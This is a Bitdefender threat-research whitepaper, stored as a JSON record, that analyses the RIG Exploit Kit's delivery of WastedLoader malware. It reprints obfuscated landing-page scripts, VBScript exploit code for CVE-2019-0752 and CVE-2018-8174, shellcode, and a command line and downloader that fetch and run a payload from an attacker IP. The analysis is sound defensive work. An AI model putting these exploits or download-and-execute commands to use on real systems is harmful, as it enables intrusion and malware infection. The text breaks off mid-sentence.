{
    "id": "e838949c-1e00-413f-95fb-915866bb5f0c",
    "created_at": "2022-10-25T16:48:14.407173Z",
    "updated_at": "2025-03-27T02:16:39.920804Z",
    "deleted_at": null,
    "sha1_hash": "01893a899e8f8b1599c502f7578c30c82bf19cbf",
    "title": "MacProStorage-T3:4Work:Bitdefender-PR-Whitepaper-creat4279-en_EN:Bitdefender-PR-Whitepaper-creat4279-en_EN.indd",
    "authors": "",
    "file_creation_date": "2021-04-22T18:44:46Z",
    "file_modification_date": "2021-04-22T18:44:50Z",
    "file_size": 4816483,
    "plain_text": "#### Secu-\n# RIG Exploit Kit delivers WastedLoader malware\n\nwww.bitdefender.com\n\n\n-----\n\n##### RIG Exploit Kit.................................................................................................................... 3\n\nDistribution.............................................................................................................................. 3\n\nExploitation chain.................................................................................................................... 4\n\nHosts........................................................................................................................................ 4\n\nLanding page........................................................................................................................... 4\n\n##### Exploits.............................................................................................................................. 6\n\nCVE-2019-0752........................................................................................................................ 6\n\nPost-exploitation command...................................................................................................7\n\nCVE-2018-8174........................................................................................................................ 9\n\nPost-exploitation shellcode....................................................................................................11\n\n##### WastedLoader................................................................................................................... 13\n\nWastedLoader first stage........................................................................................................14\n\nWastedLoader second stage.................................................................................................. 16\n\nWastedLoader third stage.......................................................................................................17\n\nWastedLoader fourth stage....................................................................................................24\n\n##### References........................................................................................................................ 25\n\n Indicators of compromise................................................................................................ 26\n\n**Authors:**\n\n**Mihai Neagu – Senior Security Researcher**\n**George Mihali – Security Researcher**\n**Aron Radu – Security Researcher**\n**Ștefan Trifescu – Security Researcher**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n\nMost of the alerts from this campaign were in Europe and the Americas:\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n### Exploitation chain\n\nThe exploitation chain starts with a malicious ad delivered from a legitimate website. The malicious ad redirects to the\nlanding page of “RIG EK”. That page then serves two exploits and, if one is successful, it executes the malware:\n\n### Hosts\n\nThe HTTP traffic before the exploitation looks like this (notice the 302 redirections):\n\nWe have seen the following hosts redirecting to RIG EK:\n\n - traffic.allindelivery.net\n\n - myallexit.xyz\n\n - clickadusweep.vip\n\n - enter.testclicktds.xyz\n\n - zeroexit.xyz\n\n - zero.testtrack.xyz\n\n### Landing page\n\nFor the above example, the landing page is at 45.138.24.35, where the malicious host serves two JavaScript\nblocks, obfuscated in similar ways: function wrappers, random variable names, comments insertion.\n\n**<html>**\n**<meta http-equiv=”x-ua-compatible” content=”IE=8”>**\n**<meta http-equiv=”Expires” content=”-1”>**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n**<div id=”xcvsr1” style=”overflow:scroll; width: 11px”>**\n**<div id=”xcsdfs” style=”width:5000001px”>**\nContenty\n**</div>**\n**</div>**\n\n**<script>LktOeoIDBT =”l”+”i”+”t”; IWfhLdvKfq=(function(){return** _/*dfdf2221*/eval;})();_\n\n[...]\neval(fWiYbtCtYs);\n**</script>**\n**<script>WTLWDZdoMx =”l”+”i”+”t”; WSkkKcJbXS=(function(){return** _/*dfdf32656*/eval;})();_\n\n[...]\neval(wiuUBevFVw);</script>\n**</body></html>**\n\nFrom what we can observe, the code requests IE-8 compatibility for the browser. In this regard, we can expect that\ncertain VBScript vulnerabilities are targeted.\n\nAfter the first eval comes another layer of similar obfuscation in both JavaScript blocks:\n\n_/*s50321d13428hfj50043fs*/_\n**var fa=xcvxc();**\n_/*s33136d33356hfj60168fs*/_\ndfgdfg = “rip”;\njkdfgd = “cript”;\nwindow[“e”+”xecS”+jkdfgd](fa, “VBScript.Encode”);\n\n**function** xcvxc() {\n**var s =** “CgkKRnVuY3Rp[...]Jh”+”c2UgYXI”+”yCk”+”VuZCBTdWI”+”KY3ZiY3Nmc2”+”RlZQ”+”og”;\n[...]\n**var A=”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/”;**\n[...]\n**for(x=0;x<L;x++) {**\n[...]\n**while(aq>=(9-1)){((a=(/*k84772fsg*/b>>>(aq-=/*xY27711300ND-**\n_Q*/10-1-1))&257-2/*k25069ffghf52348fgd*/)||(x<bx))&&(r+=dfg(a));}_\n}\n**return r;**\n}\n\nWe observed multiple techniques of obfuscating the code logic and strings:\n\n- comments insertion\n\n- the two JavaScript blocks are always obfuscated differently but the same pattern is used\n\n- in the second stage JavaScript code, var s, may hold different values\n\n- splitting methods name in multiple string tokens\n\n- calling methods using obj[“method”] instead of obj.method\n\nAfter we deobfuscated the first JavaScript block, we can more easily understand what it does:\n\n**var fa=xcvxc();**\nwindow.execScript.(fa, “VBScript.Encode”);\n\n**function** xcvxc() {\n**var payloadEncoded =** “CgkKRnVuY3Rp[...]KY3ZiY3Nmc2RlZQog”;\n**var base64dictionary={}, i, b=0, c, x, aq=0, a, payloadDecoded=””; L=payloadEncod-**\ned.length;\n\n**var base64table=”ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/”;**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n**for(i=0;i<64;i++){**\nbase64dictionary[base64table.charAt(i)]=i;\n}\n**for(x=0;x<L;x++) {**\nc=base64dictionary[payloadEncoded.charAt(x)];\nb=(b<<7-1)+c;\naq+=6;\n**while(aq>=8){**\n((a=(b>>>(aq-=8))&255)||(x<2))&&(payloadDecoded+=String.fromCharCode(a));\n}\n}\n**return payloadDecoded;**\n}\n\nThe payload is encoded using Base64, and the script implements its own decoding mechanism. The approach to\nobfuscation of the second JavaScript block is very similar to the first one, but the final payload is different.\n\nBoth these functions (xcvxc() and xcvsd45()) return VBScript exploit code, targeting different vulnerabilities.\n\nThe VBScript exploits will be analyzed in the following sections to identify the targeted vulnerabilities.\n\n## Exploits\n\nIn the previous section, we described how the VBScript is hidden and how it gets to be executed. In this section we\ndescribe what vulnerabilities are targeted by the malicious code.\n\n### CVE-2019-0752\n\nIn the VBScript code resulted from the first JavaScript block, we can see a familiar code, similar to a proof-ofconcept exploit for the CVE-2019-0752 vulnerability, developed by Simon Zuckerbraun (ZDI) and documented here. As\nthe author describes in his article, the vulnerability is a type confusion that allows the attackers to obtain a write-whatwhere primitive. Using this, an arbitrary read primitive can be forged. We can observe those things in RIG’s exploit too.\n\nThe issue is that there is no memory layout information - to overcome this a large array which will almost certainly\nguarantee that a constant address will point to a memory zone contained in the allocated buffer:\n\n**Dim ar1(&h3000000)**\n**Dim ar2(1000)**\n**Dim dgfgghjfgh**\ncxsghf = &h28281000\n\nThe function used for writing 4 bytes is done by abusing the vulnerability and writing 1 byte at a time:\n\n**Sub TriggerWrite(where, val)**\n**Dim v1**\n**Set v1 = document.getElementById(“xcvsr1”)**\nv1.scrollLeft = val\n**Dim c**\n**Set c = new** **MyClass**\nc.Value = where\n**Set v1.scrollLeft = c**\n**E d S b**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n**Sub WriteInt32With3ByteZeroTrailer(addr, val)**\nfake11 = &hff\nTriggerWrite addr , (val) AND fake11\nTriggerWrite addr + 1, (val\\&h100) AND fake11\nTriggerWrite addr + 2, (val\\&h10000) AND fake11\nTriggerWrite addr + 3, (val\\&h1000000) AND fake11\n**End Sub**\n\nAfter corrupting the virtual table of the element at address cxsghf (addressOfGremlin in the original POC) in ar1,\nvariable dgfgghjfgh (gremlin in the original POC) will be used to refer to the corrupted element of the array:\n\nTriggerWrite cxsghf, &h4003\n**For i = ((cxsghf - &h20) / &h10) Mod &h100 To UBound(ar1) Step &h100**\n**If Not IsEmpty(ar1(i)) Then**\ndgfgghjfgh = i\nExit For\n**End If**\n**Next**\n\nThe object ar1(dgfgghjfgh) will be used to create a read primitive as described by Simon Zuckerbraun, when\nreading the value ar1(dgfgghjfgh) the address of cxsghf + 8 will be dereferenced and the integer found there\nwill be returned. It is done using the following function (ReadInt32 in the original POC):\n\n**Function ghfhf(addr)**\nfake1 = &h8\nWriteInt32With3ByteZeroTrailer cxsghf + fake1, addr\nghfhf = ar1(dgfgghjfgh)\n**End Function**\n\nAfter the attackers obtain read and write control, they create an object and overwrite its vtable. Based on this, when\ncalling dummy.Exists, the result will be a call to WinExec with a custom created command line:\n\nWriteAsciiStringWith4ByteZeroTrailer addressOfDict, “((((\\..\\PowerShell.ewe -Command\n“”<#AAAAAAAAAAAAAAAAAAAAAAAAA”\nWriteInt32With3ByteZeroTrailer addressOfDict + &h3c, fakePld\nWriteAsciiStringWith4ByteZeroTrailer addressOfDict + &h40, “#>$a = “”””Start-Process\ncmd.exe `””””””cmd.exe /q /c cd /d “”%tMp%”” && echo function O(l){return Math.random().toString(36).slice(-5)};\n\n[...]\n;q.Deletefile(K);>3.tMp && stArt wsCripT //B //E:JScript 3.tMp cvbdfg\nhttp://45.138.26.235/?MzI3MzE1^&ZkgT[...] “”1””`”””””””””””” ; Invoke-Command -ScriptBlock ([Scriptblock]::Create($a))”””\n\ndict.Exists “dummy”\n\nThe command line consists of PowerShell.exe executing a cmd.exe, which in turn executes wscript.exe with a\nJavaScript script. The command line and the script it contains will be analyzed in greater depth in the next section.\n\nWe observed this exploit being served by RIG EK last year as well, but in those samples we found the VBScript code\nbeing more similar to the original POC.\n\n### Post-exploitation command\n\nAfter the CVE-2019-0752 vulnerability has been exploited, a long command line being is executed, transitioning from\nPowerShell to Cmd then to JavaScript code.\n\nU i th h d d d fil ll d 3 t i th t f ld th t t i S i t\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\ncode, then executes it using the wscript.exe tool present in Windows. The JavaScript code, in turn, downloads,\ndecrypts and executes the actual malware.\n\nIn our case, the malware download URL was:\n\nhttp://45.138.26.235/?MzI3MzE1^&ZkgTf^&oa1n4=x33QcvWfaRuPDojDM__dTaRGP0vYHliIxY2Y^&s2ht4=mKrVCJqvfzSj2beIFxj38VndSTvVgfBOKa1TbgC-jgeDLgEOmMxeC1lE87eqzkKNzVaYsJOH-UeJYQ5G-5uWRrJo3FTxm7JBdMwklhWA7WVTyu4YUVsT5A4TmKnIRaLJqUlzV0Y7VVzKe5p1pRTBViPoMjlwsfOyRDt2n-rM9cdwwZNt1h2o9w^&iJieANTcyMw==\n\nThe malware is downloaded using the WinHttpRequest object:\n\n**function** DownloadBinary(Args) {\n_/*_\n_Args(0) -> decryption key_\n_Args(1) -> url to download fromCharCode_\n_Args(2) -> 1_\n_*/_\n**var y = WScript.CreateObject(‘WinHttp.WinHttpRequest.5.1’);**\ny.setProxy(0);\ny.open(‘GET’, Args(1), 1);\ny.Option(0) = Args(2);\ny.send();\ny.WaitForResponse();\n\n**if (200** == y.status)\n{\n**return DecryptBinary(y.responseText, Args(0))**\n}\n};\n\nThen the decryption takes place, on the downloaded data:\n\n**function** DecryptBinary(EncryptedBinary, DecryptionKey) {\n**var l =** 0;\n**var n;**\n**var c = [];**\n**var q = [];**\n**var b;**\n**var p;**\n\n**for (b =** 0; 256   - b; b++)\n{\nc[b] = b;\n}\n\n**for (b =** 0; 256   - b; b++)\n{\nl = l + c[b] + DecryptionKey.charCodeAt(b % DecryptionKey.length) & 0xFF;\nn = c[b];\nc[b] = c[l];\nc[l] = n;\n}\n\n**for (p = l = b =** 0; p < EncryptedBinary.length; p++)\n{\n**var b = b +** 1 & 0xFF;\nl = l + c[b] & 0xFF;\nn = c[b];\nc[b] = c[l];\nc[l] = n;\nq.push(String.fromCharCode(EncryptedBinary.charCodeAt(p) ^ c[c[b] + c[l] &\n0xFF]));\n}\n**return q.join(‘’)**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nThe decrypted data is then saved in a file with a random name with .dll or .exe extension, depending on PE header\nCharacteristics:\n\ns.Type = 2;\ns.Charset = ‘iso-8859-1’;\ns.Open();\n**try {**\ndownloadedBinary = DownloadBinary(m);\n} catch (W) {\ndownloadedBinary = DownloadBinary(m);\n};\nd = downloadedBinary.charCodeAt(0x17 + downloadedBinary.indexOf(‘PE\\x00\\x00’));\ns.WriteText(downloadedBinary);\n**if (31** < d)\n{\n**var z =** 1;\nbinaryName += ‘dll’\n}\n**else**\n{\nbinaryName += ‘exe’;\n}\ns.savetofile(binaryName, 2);\ns.Close();\n\nIf the downloaded file is a .dll, it is executed using the following command:\n\ncmd.exe /c regsrv32.exe /s <downloaded_dll>\n\nIf the downloaded file is a .exe, it is executed using the following command:\n\ncmd.exe /c <downloaded_exe>\n\nAfter executing the malware, the JavaScript script (3.tMp) will delete itself:\n\nq.Deletefile(K);\n\n### CVE-2018-8174\n\nThe second VBScript exploit delivered by RIG EK resembles with a proof-of-concept for CVE-2018-8174 developed\nby 0x09AL here. Root cause analysis of the vulnerability was undertaken by Vladislav Stolyarov here. It was also\nanalyzed by Piotr Florczyk here.\n\nThis vulnerability lets an attacker execute arbitrary code in the context of current user through the way VBScript\nengine handles objects in memory. The vulnerability happens when an object is terminated and a custom Class_\nTerminate() is called. Then, a reference to the freed object is stored in UafArray. The FreedObjArray(1)=1\nfixes reference counter when ClassTerminate1 is copied to UafArray.\n\nWe can see the ClassTerminate1 in RIG EK’s exploit code:\n\n**Class ClassTerminate1**\n**Private** **Sub Class_Terminate()**\n**Set UafArray1(UafCounter)=FreedObjArray(1)**\nUafCounter=UafCounter+1\nFreedObjArray(1)=1\n**End Sub**\n**End Class**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nUafCounter=0\n**For index=0 To 6**\n**ReDim FreedObjArray(1)**\n**Set FreedObjArray(1)=New ClassTerminate1**\nErase FreedObjArray\n**Next**\n\nHere we can see the generated read arbitrary memory primitive. A type confusion is achieved on the mem\nmember by using two similar classes (ReuseClass, ReuseClass2), replacing ReuseClass with ReuseClass2:\n\n**Class ReuseClass**\n**Dim mem**\n\n**Function P**\n**End Function**\n\n**Function SetProp(Value)**\nmem=Value\nSetProp=0\n**End Function**\n\n**End Class**\n\n**Class ReuseClass2**\n**Dim mem**\n\n**Function P0123456789**\nP0123456789=LenB(mem(cvb4sdfs2+8))\n**End Function**\n\n**Function SPP**\n**End Function**\n\n**End Class**\n\nThe result of SetProp function places its result into ReuseClass.mem. This way, ReuseClass.mem gets the value\nof SafeArrayStructure. P=CDbl(“174088534690791e-324”) is equivalent with db 0, 0, 0, 0, 0Ch,\n20h, 0, 0, which overwrites the previous header value of the structure (VT_BSTR) with VT_ARRAY | VT_VARIANT,\nresulting in a pointer to a SAFEARRAY structure instead of a pointer to a string. This is how the type confusion is\nrealized.\n\nSafeArrayStructure=Unescape(“%u0001%u0880%u0001%u0000%u”&”0000%u0000%u0000%u0000%u”&”ffff\n%u7fff%u0000%u0000”)\nEmpty16Bytes=Unescape(“%u0000%u0000%u0000”&”%u0000%u0000%u0000%u0000%u0000”)\n\n[...]\n**Class a_b_c1125322**\n**Public** **Default** **Property Get P**\n**Dim objReuseClass2**\n\nP=CDbl(“174088534690791e-324”)\n\n**For index=0 To 6**\nUafArray1(index)=0\n**Next**\n**Set objReuseClass2=New ReuseClass2**\nobjReuseClass2.mem=SafeArrayStructure\n**For index=0 To 6**\n**Set UafArray1(index)=objReuseClass2**\n**Next**\n**End Property**\n**End Class**\n\nFinally, to trigger the code execution, an NtContinue call provided with a structure that sets the EIP to\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nexecution will return into the shellcode.\n\nThe main function of the exploit looks like this:\n\n**Sub Exploit**\nUseAfterFree\nInit()\n**dim ntContinue_str**\nntContinue_str = “NtContinue”\n\nvbs_address=LeakVBAddress()\nvbs_base=GetMzPeBase(GetUInt32(vbs_address))\nmsvcrt_base=GetImageBaseFromImports(vbs_base,”msvcrt.dll”)\nkernelbase_base=GetImageBaseFromImports(msvcrt_base,”kernelbase.dll”)\nntdll_Base=GetImageBaseFromImports(msvcrt_base,”ntdll.dll”)\nVirtualProtect_Ptr=GetProcAddress(kernelbase_base,”VirtualProtect”)\nNtContinue_Ptr=GetProcAddress(ntdll_Base, ntContinue_str)\n\nSetMemValue GetShellcode()\nshellcode_addr=GetMemVal()+8\n\nSetMemValue GetVirtualProtectStruct(shellcode_addr)\nVirtualProtectStruct=GetMemVal()+69596\n\nSetMemValue GetNtContinueStruct(VirtualProtectStruct)\nllIIll=GetMemVal()\n\nTrigger\n**End Sub**\n\nThe shellcode used by the exploit is built in GetShellcode function. The main shellcode body, stored in payload\nvariable is prefixed with an “E”, aiming to improve the obfuscation. Potential AV engines would start with the wrong\nnibble and not decode the shellcode bytes correctly.\n\n**Function GetShellcode()**\nstrString = “http://188.227.57.214/?MTYwNjg0&MiIGAT&oa1n4=x3rQdfWY[...]”\nlinkHex =””\n_‘ ASCII to hex_\n**For i=1 To Len(strString)**\nlinkHex = linkHex + Hex(Asc(Mid(strString,i,1)))\n**Next**\n\nkey = “cvbdfg”\nkeyHex =””\n_‘ ASCII to hex_\n**For i=1 To Len(key)**\nkeyHex = keyHex + Hex(Asc(Mid(key,i,1)))\n**Next**\n\nslang = “22”\nsla = “20”\nnulla = “00000000”\n\npayload = “B125831C966B96D05498034088485C975F7F...B7AAF0C9F4A4A6”\nshellcode_str = “E”+ payload + keyHex + slang + sla + slang + linkHex + slang + sla\n+ slang + “A4” + slang + nulla\n\nres=Unescape(“%u0000%u0000%u0000%u0000”) & Unescape(GetShellcodeStrFinal(shellcode_\nstr) )\nres=res & String((0x80000-LenB(res))/2,Unescape(“%u4141”))\n\nGetShellcode=res\n**End Function**\n\nI th t ti l th h ll d th t t t d h th l it f l\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n### Post-exploitation shellcode\n\n##### Decryption\n\nThe shellcode starts with a decryption snippet. It iterates over the whole rest of the shellcode and the command line,\nwhich will be triggered decrypting byte by byte using the xor cypher with key 0x84.\n\njmp   short start_decrypting\n\ndecrypt_shellcode_and_cmd:\npop   eax\nxor   ecx, ecx\nmov   cx, 56Dh\n\ndecryption_loop:\ndec   ecx\nxor   byte ptr [eax+ecx], 84h\ntest  ecx, ecx\njnz   short decryption_loop\njmp   eax\n\nstart_decrypting:\ncall  decrypt_shellcode_and_cmd\n\n##### Resolving imports\n\nThe shellcode gets the Ldr structure from TEB in order to get the ImageBase of Kernel32.dll via\nInLoadOrderModuleList field. After getting the ImageBase of the Kernel32.dll module, it retrieves the address\nof the export table by parsing the module’s PE headers.\n\nxor   eax, eax\nmov   eax, fs:[eax+_TEB.ProcessEnvironmentBlock]\nmov   eax, [eax+PEB.Ldr]\nmov   eax, [eax+PEB_LDR_DATA.InLoadOrderModuleList.Flink]\nmov   eax, [eax]\nmov   eax, [eax]\nmov   ebx, [eax+LDR_DATA_TABLE_ENTRY.DllBase]\nmov   eax, ebx\nadd   eax, [eax+IMAGE_DOS_HEADER.e_lfanew]\nmov   edx, [eax+IMAGE_NT_HEADERS.OptionalHeader.DataDirectory.VirtualAddress]\nadd   edx, ebx\n\nSince the export table address was retrieved, the shellcode starts iterating over the names, ordinals and functions to\nfind function CreateProcessA:\n\nmov   edi, [edx+IMAGE_EXPORT_DIRECTORY.AddressOfNames]\nadd   edi, ebx\nxor   ecx, ecx\n\nsearch_CreateProcessA_function:\nmov   eax, [edi]\nadd   eax, ebx\ncmp   dword ptr [eax], ‘aerC’\njnz   short next_function_name\ncmp   dword ptr [eax+0Bh], ‘Ass’\njnz   short next_function_name\nmov   eax, [edx+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]\nadd   eax, ebx\nmovzx  eax, word ptr [eax+ecx*2]\nmov   edx, [edx+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]\nadd   edx, ebx\nadd   ebx, [edx+eax*4]\njmp   short call_CreateProcessA\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nadd   edi, 4\ninc   ecx\ncmp   ecx, [edx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]\njl   short search_CreateProcessA_function\n\n##### Command execution\n\nOnce the CreateProcessA function address is retrieved, it is time to call it. This part of the shellcode is basically\npreparing the arguments for the call:\n\ncall_CreateProcessA:\nlea   eax, [ebp-10h] ; eax = ptr to _PROCESS_INFORMATION\npush  eax\nlea   edi, [ebp-54h] ; edi = ptr to _STARTUPINFOA\npush  edi\nxor   eax, eax\nmov   ecx, 11h\nrep stosd\nmov   word ptr [ebp-28h], ; _STARTUPINFOA.dwFlags = STARTF_USESHOWWINDOW |\nSTARTF_USESTDHANDLES\nmov   dword ptr [ebp-54h], 44h ; _STARTUPINFOA.cb = 0x44\npush  eax\npush  eax\npush  eax\ninc   eax\npush  eax\ndec   eax\npush  eax\npush  eax\njmp   short push_cmd_address_on_stack ; jmp+call trick to obtain the Eip\n\nsub_10009F:\npush  eax\ncall  ebx       ; ebx = CreateProcessA/CreateProcessAStub\npop   edi\npop   ecx\npop   ebx\nshl   eax, 3\nadd   eax, 6\nleave\nretn\n\npush_cmd_address_on_stack:\ncall  sub_10009F   ; jmp+call trick to obtain the Eip\n\nFinally, calling CreateProcessA with the malicious command line described earlier, in the “Post-exploitation\ncommand” section:\n\nCreateProcessA(0, <malicious_cmd>, 0, 0, 1, 0, 0, 0, &startupInfo, &processInformation);\n\nThis ultimately leads to execution of the downloaded malware, which is described in the next section.\n\n## WastedLoader\n\nThe delivered malware looks like a new variant of WastedLocker, but this new sample is missing the ransomware\npart, which is probably downloaded from the C&C servers. Because it works like a loader for the downloaded payload,\nwe named it WastedLoader.\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nThe first stage checks the same UCOMIEnumConnections registry key as reported for other WastedLocker variants\nby VMRay Labs and nccgroup in the summer of 2020. We did not see ransomware functionality in our sample, as it\nprobably gets delivered later by the C&C servers.\n\nThe sample we are looking at is a 1.4MB, 32-bit Windows GUI executable, with MD5 hash:\n\n6afc5c3e1caa344989513b2773ae172a\n\nAttackers have put a fake icon and description in version resources to make it look like a legitimate process:\n\nWe will analyze WastedLoader’s unpacking stages and its behavior, focusing on anti-reversing and evasion\ntechniques.\n\n### WastedLoader first stage\n\n##### Sandbox evasion\n\nBefore doing anything, the malware performs an anti-emulation loop, consisting of 11 million calls to the GetInputState\nfunction. This has virtually no effect in normal runs but might reach maximum instruction limit when emulated. It also\ntargets emulators that do not implement some user interface APIs, like this one:\n\n**for (i = 0; i < 11588822; ++i)**\nGetInputState();\n\nNext, the malware checks if the UCOMIEnumConnections interface registry key exists:\n\nHKEY_CLASSES_ROOT\\interface\\{b196b287-bab4-101a-b69c-00aa00341d07}\n\nIf the key does not exist, the execution enters an infinite loop, and no other operations will be performed. This also\ntargets emulators that do not fully implement the full registry:\n\n_// decode key name from obfuscated string_\nkeyName[17] = 237;\nkeyName[17] -= 181;\nkeyName[18] = 236;\nkeyName[18] -= 181;\nkeyName[19] = 226;\nkeyName[19] -= 181;\n...\n_// keyName is now “interface\\{b196b287-bab4-101a-b69c-00aa00341d07}”_\n**if ( RegOpenKeyW(HKEY CLASSES ROOT, keyName, phkResult) )**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\n**while ( 1 )**\n{\n_// do nothing indefinitely_\n}\n}\n\n##### Code-flow obfuscation\n\nSome API calls are obfuscated by using the push/jmp combo instead of the call instruction:\n\npush  offset loc_40183D\njmp   _VirtualAllocEx\nloc_40183D:\nmov   dword_4E2CC8, eax\n\nThis is equivalent to a VirtualAllocEx call:\n\ncall VirtualAllocEx\nloc_40183D:\nmov   dword_4E2CC8, eax\n\nThese combos can be deobfuscated at disassembly time, by writing a Python IDA plugin and using the ev_ana_insn\ncallback:\n\n**def ev_ana_insn(self, insn):**\na = insn.ea\nb = bytes(idaapi.get_bytes(a, 30))\n\n_# push ret_addr, jmp api ==> call api, nop_\n**if b[0] ==** 0x68 **and b[5] ==** 0xFF **and b[6] ==** 0x25:\npush_target = idaapi.get_wide_dword(a+1)\ncall_target = idaapi.get_wide_dword(a+7)\n**if push_target == a+11:**\nprint(‘### <!> Push/Jmp: %x’ % a)\nidaapi.put_word(a, 0x15FF)\nidaapi.put_dword(a+2, call_target)\nidaapi.put_dword(a+6, 0x90909090)\nidaapi.put_byte(a+10, 0x90)\n\nIn another interesting anti-emulation trick, the GetStockObject function is used, but not for its normal functionality.\nOutside the correct values for the argument, the function will always return zero. This zero returned value is sometimes\nused to obfuscate assignments:\n\nv1 = GetStockObject(4576) + dword_4E2C80;\nv2 = GetStockObject(4576) + dword_4E2C80;\nv3 = &v2[GetStockObject(4576)];\nv3[GetStockObject(4576) + dword_4E2C8C] = v1[dword_4E2C90];\n\nWe can see in the decompiled GetStockObject function inside gdi32.dll that it returns zero for any argument\nabove the number 31 (like 4576 above):\n\nHGDIOBJ __stdcall GetStockObject(int a1)\n{\n**if (a1 > 31)**\n**return** 0;\n...\n}\n\n##### Shellcode decryption\n\nAfter allocating memory with RWX protection, 0x3BE00 bytes (240KB) are decrypted from the .t4xt12 section, for the\nsecond stage:\n\nint __cdecl decrypt_dword(int a1_unused, int current_offset)\n{\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nxor_key = current_offset + 6;\n**return xor_current_dword_with_xor_key();**\n}\n\nAfter that, the execution is passed to the decrypted shellcode, by jumping to it (offset 0x3BBC0):\n\nmov   eax, _decrypted_block\nadd   eax, 3BBC0h\nmov   entry_point, eax\n...\nmov   edx, entry_point\njmp   edx\n\n### WastedLoader second stage\n\n##### Imports\n\nFirst, the shellcode resolves a few API imports, using the LoadLibraryExA & GetProcAddress combo. These are\nmemory and file functions like VirtualAlloc or UnmapViewOfFile. Using these functions, the third stage malware\nmodule is loaded in the current process, using the reflective DLL injection technique.\n\nThe module contents are first decrypted in a similar way to the first stage, for a total of 0x3AE00 bytes (240KB).\n\n**for ( i = 0; i < length; i += 4 )**\n{\n*(_DWORD *)(i + address) += i;\n*(_DWORD *)(i + address) ^= i + 1001;\nresult = i + 4;\n}\n\n##### Reflective DLL injection\n\nThe PE headers are copied to newly allocated memory, and sections are created with the recently decrypted data:\n\nmem_fill(vars->mem, 0, nt_headers->OptionalHeader.SizeOfImage);\nmem_cpy(vars->mem, base, nt_headers->OptionalHeader.SizeOfHeaders);\nvars->code_entry_point = nt_headers->OptionalHeader.AddressOfEntryPoint + vars->mem;\n**for ( i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i )**\n{\n**if (sections->PointerToRawData > 0)**\n{\n**if (sections->SizeOfRawData > 0)**\nmem_cpy(\nsections->VirtualAddress + vars->mem,\n&base[sections->PointerToRawData],\nPADDED(sections->SizeOfRawData));\n}\n++sections;\n}\n\nAfter solving imports for the reflected module, relocation fixups are applied, then memory protection is set for each\nsection according to its characteristics:\n\nresolve_imports_from_directory(vars, mem);\nbase_delta = vars->mem - hdr->OptionalHeader.ImageBase;\nreloc = hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n**if (reloc.Size > 0 && base_delta > 0)**\napply_fixups(mem + reloc.VirtualAddress, vars->mem, base_delta);\n**for (j = 0; j < hdr->FileHeader.NumberOfSections; ++j)**\n{\n\n**if (sections2->PointerToRawData > 0 && sections2->SizeOfRawData > 0)**\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nsection_protection = section_page_protection(sections2->Characteristics);\nvars->VirtualProtect(\n(LPVOID)(sections2->VirtualAddress + vars->mem),\nsections2->Misc.VirtualSize,\nsection_protection,\n&oldProtect);\n}\n++sections2;\n}\n\nFinally, the entry point of the reflected module is jumped to, reaching 3rd stage:\n\nmov   edx, [ebp+vars.code_entry_point]\njmp   edx\n\n### WastedLoader third stage\n\n##### Imports\n\nThe DLL only imports two bogus functions statically (OutputDebugStringA, Sleep), while all the malware functionality relies on dynamic imports (resolved at runtime).\n\nThe dynamic imports are not resolved all at once. Instead, the resolver functionality is included inline before every\nimport is used. The resolver has a cache where it keeps already-resolved functions, and the cache functionality is also\ninline. This creates unnecessary complex code, that contributes to obfuscation.\n\nLoaded modules are located using the PEB’s InLoadOrderModuleList doubly linked list:\n\nmov   eax, large fs:18h\nmov   eax, [eax+_TEB.ProcessEnvironmentBlock]\n...\nmov   eax, [eax+_PEB.Ldr]\nmov   esi, [eax+_PEB_LDR_DATA.InLoadOrderModuleList.Flink]\nmov   edi, [eax+_PEB_LDR_DATA.InLoadOrderModuleList.Blink]\n...\nmov   ecx, [esi+_LDR_MODULE.BaseDllName.Buffer]\n\nImported function and module names are hashed using the CRC32 algorithm, and xor-ed with a constant key. The\nhash implementation is done using SSE instructions for more obfuscation:\n\nmovdqa xmm6, xmm3\nmovdqa xmm1, xmm4\npand  xmm6, xmm4\npcmpeqd xmm0, xmm0\npcmpeqd xmm6, xmm5\npsrld  xmm1, 1\npxor  xmm6, xmm0\n\nThe resolver functions take two parameters, hashes of imported module and function name:\n\nvoid* __stdcall resolve_function(DWORD module_crc, DWORD function_crc)\n\nTo achieve deobfuscation, we do the following trick:\n\nPlace a breakpoint on start of resolver function, where we display the argument hashes, and another breakpoint on the\nend of the function where we display the returned imported function (WinDBG in this case):\n\nbp resolve function start “? poi(esp+4); ? poi(esp+8); g”\n\n\n-----\n\nRIG Exploit Kit delivers WastedLoader malware\n\nThis will get all resolved names and their hashes in the debugger log, so we can build an enumeration like this:\n\n**enum crc_strings**\n{\naNTDLL_DLL = 0x588AB3EA,\naKERNEL32_DLL = 0xA1310F65,\n...\naCreateThread = 0xA8D05ACB,\naExitProcess = 0x1DAACBB7,\naNtProtectVirtualMemory = 0x649746EC,\naRtlCreateHeap = 0xC0B67DE0,\n...\n}\n\nThen we can reverse the hashes back to function and module names, by using the created enum:\n\nvoid* __stdcall resolve_function(crc_strings module_crc, crc_strings function_crc)\n\nSo the hash values:\n\nvar = resolve_function(0xA1310F64, 0x1DAACBB7);\n\nget resolved to:\n\nvar = resolve_function(aKERNEL32_DLL, 